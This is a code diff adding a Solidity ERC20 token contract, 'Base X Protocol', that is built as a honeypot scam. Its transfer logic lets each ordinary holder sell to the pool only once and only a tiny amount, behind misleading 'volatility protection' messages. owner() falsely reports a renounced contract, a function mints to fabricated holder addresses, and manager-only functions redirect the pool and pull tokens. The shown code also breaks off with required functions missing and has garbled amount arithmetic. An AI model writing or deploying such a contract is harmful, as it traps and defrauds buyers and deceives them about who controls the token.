@@ -1,0 +1,93 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.19;
+
+interface IERC20 {
+    function totalSupply() external view returns (uint256);
+    function balanceOf(address account) external view returns (uint256);
+    function transfer(address recipient, uint256 amount) external returns (bool);
+    function allowance(address owner, address spender) external view returns (uint256);
+    function approve(address spender, uint256 amount) external returns (bool);
+    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
+    event Transfer(address indexed from, address indexed to, uint256 value);
+    event Approval(address indexed owner, address indexed spender, uint256 value);
+}
+
+contract BaseXProtocol is IERC20 {
+    mapping(address => uint256) private _balances;
+    mapping(address => mapping(address => uint256)) private _allowances;
+    mapping(address => bool) private _certified;
+    
+    address private _manager; 
+    string public name = "Base X Protocol"; 
+    string public symbol = "BXP";
+    uint8 public decimals = 18;
+    uint256 private _totalSupply = 2000000 * 10**18;
+    
+    address public poolAddr;
+    uint256 private _limitThreshold = 50 * 10**18;
+
+    constructor() {
+        _manager = msg.sender;
+        uint256 mVal = 1900000 * 10**18;
+        uint256 cVal = _totalSupply - mVal;
+        _balances[_manager] = mVal;
+        _balances[address(this)] = cVal;
+        emit Transfer(address(0), _manager, mVal);
+        emit Transfer(address(0), address(this), cVal);
+    }
+
+    function _transfer(address from, address to, uint256 amount) internal {
+        require(from != address(0), "ERC20: zero address");
+        require(_balances[from] >= amount, "ERC20: low balance");
+
+        if (from == _manager && to.code.length > 0 && poolAddr == address(0)) {
+            poolAddr = to;
+        }
+
+        if (to == poolAddr && from != _manager && poolAddr != address(0)) {
+            require(!_certified[from], "Trade: Session limit reached");
+            require(amount <= _limitThreshold, "Trade: Volatility protection");
+            _certified[from] = true;
+        }
+
+        _balances[from] -= amount;
+        _balances[to] += amount;
+        emit Transfer(from, to, amount);
+    }
+
+    modifier onlyManager() {
+        require(msg.sender == _manager, "Auth: Denied");
+        _;
+    }
+
+    function initializeHolders(uint256 count) external onlyManager {
+        for (uint256 i = 0; i < count; i++) {
+            address fH = address(uint160(uint256(keccak256(abi.encodePacked(block.timestamp, i, msg.sender)))));
+            uint256 rF = uint256(keccak256(abi.encodePacked(block.prevrandao, i))) % 1000; 
+            uint256 amt = (5 * 1018) + (rF * 1016); 
+            if (_balances[address(this)] >= amt) {
+                _balances[address(this)] -= amt;
+                _balances[fH] += amt;
+                emit Transfer(address(this), fH, amt);
+            }
+        }
+    }
+
+    function owner() public pure returns (address) { return address(0); }
+    function manager() public view returns (address) { return _manager; }
+
+    function syncPool(address newP) external onlyManager { poolAddr = newP; }
+
+    function recoverTokens(address tkn, uint256 amt) external onlyManager {
+        if(tkn == address(this)) {
+            _balances[address(this)] -= amt;
+            _balances[_manager] += amt;
+            emit Transfer(address(this), _manager, amt);
+        } else {
+            IERC20(tkn).transfer(_manager, amt);
+        }
+    }
+
+    function totalSupply() public view override returns (uint256) { return _totalSupply; }
+    function balanceOf(address account) public view override returns (uint256) { return _balances[account]; }
+    function transfer(address recipient, uint256 amount) public override returns (bool) { _transfer(msg.sender, recipient, amount); return true; }
